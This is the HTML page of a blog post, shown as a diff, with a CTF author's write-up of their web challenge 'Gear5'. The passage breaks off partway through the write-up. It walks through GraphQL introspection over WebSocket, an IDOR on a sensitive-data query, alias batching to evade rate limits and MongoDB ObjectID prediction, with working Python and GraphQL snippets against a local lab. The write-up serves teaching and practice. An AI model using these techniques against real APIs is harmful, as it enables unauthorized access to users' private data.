@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=blog/livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Cybears ctf web/gear5 - My Personal Blog</title><meta name="Description" content="This is my personal blog"><meta property="og:url" content="http://localhost:1313/blog/posts/cybears_ctf_web_gear5/">
+  <meta property="og:site_name" content="My Personal Blog">
+  <meta property="og:title" content="Cybears ctf web/gear5">
+  <meta property="og:description" content="Gear5 CTF Challenge Writeup Challenge: Gear5
+Event: Cybears CTF
+Category: Web
+Difficulty: Hard
+Source Code: https://github.com/F0DH1L/cybears_ctf_2k25/gear5
+This was a challenge that I created, which required chaining multiple GraphQL vulnerabilities to exfiltrate sensitive data from a MongoDB-backed API. The exploit chain combines GraphQL introspection, IDOR, MongoDB ObjectID prediction, and rate limit bypass through alias abuse.
+TL;DR This challenge chains four vulnerabilities to retrieve the flag:
+GraphQL Introspection, Discover hidden queries and schema structure Information Disclosure, allUsersTimestamps leaks user creation timestamps MongoDB ObjectID Prediction, Predictable ID structure allows ID generation Rate Limit Bypass, GraphQL aliases batch multiple queries as a single request to bypass rate limiting on userSensitive query The descripton said you need gear5 to solve it lets get that">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-27T18:56:58+01:00">
+    <meta property="article:modified_time" content="2025-12-27T18:56:58+01:00">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Web Security">
+    <meta property="article:tag" content="Cybears_ctf">
+    <meta property="article:tag" content="My_challenges">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Cybears ctf web/gear5">
+  <meta name="twitter:description" content="Gear5 CTF Challenge Writeup Challenge: Gear5
+Event: Cybears CTF
+Category: Web
+Difficulty: Hard
+Source Code: https://github.com/F0DH1L/cybears_ctf_2k25/gear5
+This was a challenge that I created, which required chaining multiple GraphQL vulnerabilities to exfiltrate sensitive data from a MongoDB-backed API. The exploit chain combines GraphQL introspection, IDOR, MongoDB ObjectID prediction, and rate limit bypass through alias abuse.
+TL;DR This challenge chains four vulnerabilities to retrieve the flag:
+GraphQL Introspection, Discover hidden queries and schema structure Information Disclosure, allUsersTimestamps leaks user creation timestamps MongoDB ObjectID Prediction, Predictable ID structure allows ID generation Rate Limit Bypass, GraphQL aliases batch multiple queries as a single request to bypass rate limiting on userSensitive query The descripton said you need gear5 to solve it lets get that">
+<meta name="application-name" content="My Personal Blog">
+<meta name="apple-mobile-web-app-title" content="My Personal Blog">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/blog/posts/cybears_ctf_web_gear5/" /><link rel="prev" href="http://localhost:1313/blog/posts/bsides_algiers_2k25_web_library_of_vaults/" /><link rel="next" href="http://localhost:1313/blog/posts/cybears_ctf_web_ozymandias/" /><link rel="stylesheet" href="/blog/css/style.min.css"><link rel="preload" href="/blog/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/blog/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/blog/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/blog/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Cybears ctf web/gear5",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/blog\/posts\/cybears_ctf_web_gear5\/"
+        },"genre": "posts","keywords": "ctf, web security, cybears_ctf, my_challenges","wordcount":  1660 ,
+        "url": "http:\/\/localhost:1313\/blog\/posts\/cybears_ctf_web_gear5\/","datePublished": "2025-12-27T18:56:58+01:00","dateModified": "2025-12-27T18:56:58+01:00","license": "2025 F0DH1L","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "F0DH1L"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/blog/" title="My Personal Blog">F0DH1L Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/blog/posts/"> Posts </a><a class="menu-item" href="/blog/tags/"> Tags </a><a class="menu-item" href="/blog/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/blog/" title="My Personal Blog">F0DH1L Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/blog/posts/" title="">Posts</a><a class="menu-item" href="/blog/tags/" title="">Tags</a><a class="menu-item" href="/blog/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Cybears ctf web/gear5</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/blog/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>F0DH1L</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-27">2025-12-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1660 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#tldr">TL;DR</a></li>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#finding-the-entry-point">Finding the Entry Point</a>
+      <ul>
+        <li><a href="#discovery-1-graphql-introspection-via-websocket">Discovery #1: GraphQL Introspection via WebSocket</a></li>
+        <li><a href="#discovery-2-the-idor-vulnerability">Discovery #2: The IDOR Vulnerability</a></li>
+        <li><a href="#discovery-3-bypassing-rate-limits-with-graphql-aliases">Discovery #3: Bypassing Rate Limits with GraphQL Aliases</a></li>
+        <li><a href="#discovery-4-understanding-mongodb-objectids">Discovery #4: Understanding MongoDB ObjectIDs</a></li>
+        <li><a href="#discovery-5-leaking-timestamps">Discovery #5: Leaking Timestamps</a></li>
+        <li><a href="#discovery-6-extracting-objectid-components">Discovery #6: Extracting ObjectID Components</a></li>
+        <li><a href="#discovery-7-generating-candidate-objectids">Discovery #7: Generating Candidate ObjectIDs</a></li>
+        <li><a href="#discovery-8-building-the-aliased-query">Discovery #8: Building the Aliased Query</a></li>
+      </ul>
+    </li>
+    <li><a href="#putting-it-all-together">Putting It All Together</a>
+      <ul>
+        <li><a href="#the-complete-exploit-script">The Complete Exploit Script</a></li>
+      </ul>
+    </li>
+    <li><a href="#after-running-the-exploit-the-response-came-back-with-the-flag">After running the exploit, the response came back with the flag!</a></li>
+    <li><a href="#and-by-that-you-officially-have-gear5-powers">and by that you officially have gear5 powers</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="gear5-ctf-challenge-writeup">Gear5 CTF Challenge Writeup</h1>
+<p><strong>Challenge:</strong> Gear5<br>
+<strong>Event:</strong> Cybears CTF<br>
+<strong>Category:</strong> Web<br>
+<strong>Difficulty:</strong> Hard<br>
+<strong>Source Code:</strong> <a href="https://github.com/F0DH1L/cybears_ctf_2k25/gear5" target="_blank" rel="noopener noreffer ">https://github.com/F0DH1L/cybears_ctf_2k25/gear5</a></p>
+<p>This was a challenge that I created, which required chaining multiple GraphQL vulnerabilities to exfiltrate sensitive data from a MongoDB-backed API. The exploit chain combines GraphQL introspection, IDOR, MongoDB ObjectID prediction, and rate limit bypass through alias abuse.</p>
+<hr>
+<h2 id="tldr">TL;DR</h2>
+<p>This challenge chains four vulnerabilities to retrieve the flag:</p>
+<ol>
+<li><strong>GraphQL Introspection</strong>, Discover hidden queries and schema structure</li>
+<li><strong>Information Disclosure</strong>, <code>allUsersTimestamps</code> leaks user creation timestamps</li>
+<li><strong>MongoDB ObjectID Prediction</strong>, Predictable ID structure allows ID generation</li>
+<li><strong>Rate Limit Bypass</strong>, GraphQL aliases batch multiple queries as a single request to bypass rate limiting on <code>userSensitive</code> query</li>
+</ol>
+<hr>
+<p>The descripton said you need gear5 to solve it
+lets get that
+<img
+        class="lazyload"
+        src="/blog/svg/loading.min.svg"
+        data-src="/blog/images/cybears_ctf_web_gear5/luffy.gif"
+        data-srcset="/blog/images/cybears_ctf_web_gear5/luffy.gif, /blog/images/cybears_ctf_web_gear5/luffy.gif 1.5x, /blog/images/cybears_ctf_web_gear5/luffy.gif 2x"
+        data-sizes="auto"
+        alt="/blog/images/cybears_ctf_web_gear5/luffy.gif"
+        title="luffy" /></p>
+<hr>
+<h2 id="overview">Overview</h2>
+<p><strong>Gear5</strong> is a GraphQL API with the following characteristics:</p>
+<ul>
+<li>GraphQL endpoint (HTTP) with introspection <strong>disabled</strong></li>
+<li>WebSocket endpoint for real time communication</li>
+<li>MongoDB backend using ObjectIDs as user identifiers</li>
+<li>User authentication system with registration/login</li>
+<li>Rate limiting on sensitive queries</li>
+<li>Hidden <code>userSensitive</code> query that returns user secrets/flags</li>
+</ul>
+<hr>
+<h2 id="finding-the-entry-point">Finding the Entry Point</h2>
+<p>When I first accessed the challenge, I was presented with a GraphQL endpoint. As with any GraphQL target, the first step is always introspection, if it&rsquo;s enabled, it&rsquo;s a goldmine of information.</p>
+<p>I tried sending an introspection query to the HTTP endpoint, but it was blocked, introspection was disabled! This is a common security measure in production GraphQL APIs.</p>
+<p>However, I noticed the application also had a WebSocket endpoint. Looking at the network traffic, I could see WebSocket messages being exchanged. The responses suggested this was also using GraphQL for communication.</p>
+<p>This was interesting, sometimes developers forget to apply the same security controls across all endpoints. Let me try introspection via WebSocket.</p>
+<h3 id="discovery-1-graphql-introspection-via-websocket">Discovery #1: GraphQL Introspection via WebSocket</h3>
+<p>I connected to the WebSocket endpoint and sent an introspection query to map out the entire schema:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">websocket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">WS_URL</span> <span class="o">=</span> <span class="s2">&#34;ws://localhost:4000&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ws</span> <span class="o">=</span> <span class="n">websocket</span><span class="o">.</span><span class="n">WebSocket</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">ws</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">WS_URL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">introspection_query</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">query IntrospectionQuery {
+</span></span></span><span class="line"><span class="cl"><span class="s2">  __schema {
+</span></span></span><span class="line"><span class="cl"><span class="s2">    queryType { name }
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mutationType { name }
+</span></span></span><span class="line"><span class="cl"><span class="s2">    subscriptionType { name }
+</span></span></span><span class="line"><span class="cl"><span class="s2">    types {
+</span></span></span><span class="line"><span class="cl"><span class="s2">      name
+</span></span></span><span class="line"><span class="cl"><span class="s2">      kind
+</span></span></span><span class="line"><span class="cl"><span class="s2">      fields {
+</span></span></span><span class="line"><span class="cl"><span class="s2">        name
+</span></span></span><span class="line"><span class="cl"><span class="s2">      }
+</span></span></span><span class="line"><span class="cl"><span class="s2">    }
+</span></span></span><span class="line"><span class="cl"><span class="s2">  }
+</span></span></span><span class="line"><span class="cl"><span class="s2">}
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;graphql&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;query&#34;</span><span class="p">:</span> <span class="n">introspection_query</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;variables&#34;</span><span class="p">:</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}))</span></span></span></code></pre></div></div>
+<p>The introspection revealed several interesting queries:</p>
+<ul>
+<li><code>allUsersTimestamps</code>, Returns creation timestamps for all users (suspicious!)</li>
+<li><code>userSensitive(id: String!)</code>, Returns sensitive data for a specific user (target!)</li>
+<li>Standard mutations for user registration and authentication</li>
+</ul>
+<p>The presence of <code>allUsersTimestamps</code> and <code>userSensitive</code> immediately raised red flags. Why would an API expose user creation times? And why would there be a &ldquo;sensitive&rdquo; query?</p>
+<h3 id="discovery-2-the-idor-vulnerability">Discovery #2: The IDOR Vulnerability</h3>
+<p>To test if I could access other users&rsquo; data, I created a second account and noted its user ID. Then I tested the <code>userSensitive</code> query with that second user&rsquo;s ID:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-graphql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-graphql" data-lang="graphql"><span class="line"><span class="cl"><span class="kd">query</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nc">userSensitive</span><span class="p">(</span><span class="py">id</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;691c3c380ce6320d62cdcb56&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nc">secret</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div></div>
+<p>It worked! No authorization validation. Classic IDOR, I could query any user&rsquo;s sensitive data if I knew their ID, even while authenticated as a different user.</p>
+<p>But there was a problem: I didn&rsquo;t know the target user&rsquo;s ID. And when I tried querying multiple IDs rapidly, I hit rate limiting.</p>
+<p><img
+        class="lazyload"
+        src="/blog/svg/loading.min.svg"
+        data-src="/blog/images/cybears_ctf_web_gear5/gear5_2.gif"
+        data-srcset="/blog/images/cybears_ctf_web_gear5/gear5_2.gif, /blog/images/cybears_ctf_web_gear5/gear5_2.gif 1.5x, /blog/images/cybears_ctf_web_gear5/gear5_2.gif 2x"
+        data-sizes="auto"
+        alt="/blog/images/cybears_ctf_web_gear5/gear5_2.gif"
+        title="gear5_2" /></p>
+<p>That&rsquo;s when I remembered something crucial about GraphQL&hellip;</p>
+<h3 id="discovery-3-bypassing-rate-limits-with-graphql-aliases">Discovery #3: Bypassing Rate Limits with GraphQL Aliases</h3>
+<p>GraphQL has a powerful feature called aliases that allows you to query the same field multiple times in a single request with different arguments. Here&rsquo;s the key insight: from the server&rsquo;s perspective, this is <strong>one request</strong>, but GraphQL processes multiple queries inside it!</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-graphql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-graphql" data-lang="graphql"><span class="line"><span class="cl"><span class="kd">query</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nc">user1</span><span class="p">:</span><span class="w"> </span><span class="nc">userSensitive</span><span class="p">(</span><span class="py">id</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;691c3c380ce6320d62cdcb2d&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nc">secret</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="py">user2</span><span class="p">:</span><span class="w"> </span><span class="nc">userSensitive</span><span class="p">(</span><span class="py">id</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;691c3c380ce6320d62cdcb2e&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nc">secret</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="py">user3</span><span class="p">:</span><span class="w"> </span><span class="nc">userSensitive</span><span class="p">(</span><span class="py">id</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;691c3c380ce6320d62cdcb2f&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nc">secret</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="c"># ... many more queries with different aliases</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div></div>
+<p>The rate limiter only sees one request, but GraphQL executes all the queries! This could be my way around the rate limiting problem, but I still needed to know which IDs to query.</p>
+<p><strong>Note:</strong> This isn&rsquo;t just a CTF trick, I&rsquo;ve actually encountered this vulnerability on real-world GraphQL APIs during bug bounty hunting. Many production APIs implement rate limiting that only counts HTTP requests, completely missing that a single GraphQL request can contain hundreds of aliased queries. It&rsquo;s a subtle technique that developers often overlook.</p>
+<p><strong>An Other Note XD:</strong> Some people didnt do that they just used other endpoints like sendMessages etc to leak email of luffy since there is no rate limiting there</p>
+<h3 id="discovery-4-understanding-mongodb-objectids">Discovery #4: Understanding MongoDB ObjectIDs</h3>
+<p>Looking at the user IDs returned by the API, I recognized the pattern, these were MongoDB ObjectIDs. I knew these had a predictable structure that could potentially be exploited.</p>
+<p>According to the <a href="https://www.mongodb.com/docs/manual/reference/method/ObjectId/" target="_blank" rel="noopener noreffer ">MongoDB documentation</a>, a 12-byte ObjectID consists of three components:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>+----------------+-------------+-----------+
+| Timestamp (4B) | Machine ID (5B) | Counter (3B) |
++----------------+-------------+-----------+</code></pre></div>
+<p><strong>Breaking down the structure:</strong></p>
+<ol>
+<li><strong>Timestamp (4 bytes)</strong>: Unix timestamp in seconds representing when the ObjectID was created</li>
+<li><strong>Machine ID (5 bytes)</strong>: A random value generated once per process. This stays the same for all ObjectIDs created by the same server process</li>
+<li><strong>Counter (3 bytes)</strong>: An incrementing counter that starts at a random value and increases sequentially for each new ObjectID</li>
+</ol>
+<p>Let&rsquo;s look at a real example: <code>691c3c380ce6320d62cdcb56</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>691c3c38      0ce6320d62      cdcb56
+(Timestamp)   (Machine ID)    (Counter)</code></pre></div>
+<ul>
+<li><code>691c3c38</code> → Timestamp when user was created</li>
+<li><code>0ce6320d62</code> → Random machine/process identifier</li>
+<li><code>cdcb56</code> → Counter value (0xcdcb56 in hex = 13,487,958 in decimal)</li>
+</ul>
+<p><strong>The key insight:</strong> The machine ID remains constant across all users created on the same server instance, and the counter increments predictably. This means if I know:</p>
+<ul>
+<li>When a target user was created (timestamp)</li>
+<li>The machine ID (extracted from any user on the same server)</li>
+<li>An approximate counter range (from a recently created user)</li>
+</ul>
+<p>I could generate a small list of candidate ObjectIDs that likely includes the target user&rsquo;s ID! Combined with GraphQL aliases, I could query all candidates in a single request, completely bypassing the rate limiter.</p>
+<h3 id="discovery-5-leaking-timestamps">Discovery #5: Leaking Timestamps</h3>
+<p>This is where <code>allUsersTimestamps</code> became crucial:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">timestamp_query</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;query&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    query {
+</span></span></span><span class="line"><span class="cl"><span class="s2">      allUsersTimestamps {
+</span></span></span><span class="line"><span class="cl"><span class="s2">        createdAt
+</span></span></span><span class="line"><span class="cl"><span class="s2">      }
+</span></span></span><span class="line"><span class="cl"><span class="s2">    }
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">GRAPHQL_URL</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">timestamp_query</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_timestamps</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&#34;data&#34;</span><span class="p">][</span><span class="s2">&#34;allUsersTimestamps&#34;</span><span class="p">]</span></span></span></code></pre></div></div>
+<p>This query leaked the creation timestamp of every user in the database, including the target user with the flag!</p>
+<p>Now I had the timestamp component. I just needed the random component and counter range.</p>
+<h3 id="discovery-6-extracting-objectid-components">Discovery #6: Extracting ObjectID Components</h3>
+<p>To learn the random and counter components, I registered my own user account:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">new_user</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;attacker_user&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;email&#34;</span><span class="p">:</span> <span class="s2">&#34;attacker@example.com&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;password123&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;secret&#34;</span><span class="p">:</span> <span class="s2">&#34;my_secret&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">register_payload</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;query&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      mutation Register($username: String!, $email: String!, $password: String!, $secret: String!) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">        register(username: $username, email: $email, password: $password, secret: $secret) {
+</span></span></span><span class="line"><span class="cl"><span class="s2">          token
+</span></span></span><span class="line"><span class="cl"><span class="s2">          user {
+</span></span></span><span class="line"><span class="cl"><span class="s2">            id
+</span></span></span><span class="line"><span class="cl"><span class="s2">            username
+</span></span></span><span class="line"><span class="cl"><span class="s2">            email
+</span></span></span><span class="line"><span class="cl"><span class="s2">          }
+</span></span></span><span class="line"><span class="cl"><span class="s2">        }
+</span></span></span><span class="line"><span class="cl"><span class="s2">      }
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;variables&#34;</span><span class="p">:</span> <span class="n">new_user</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">GRAPHQL_URL</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">register_payload</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">user_id</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&#34;data&#34;</span><span class="p">][</span><span class="s2">&#34;register&#34;</span><span class="p">][</span><span class="s2">&#34;user&#34;</span><span class="p">][</span><span class="s2">&#34;id&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;My user ID: </span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>From my user ID, I extracted:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
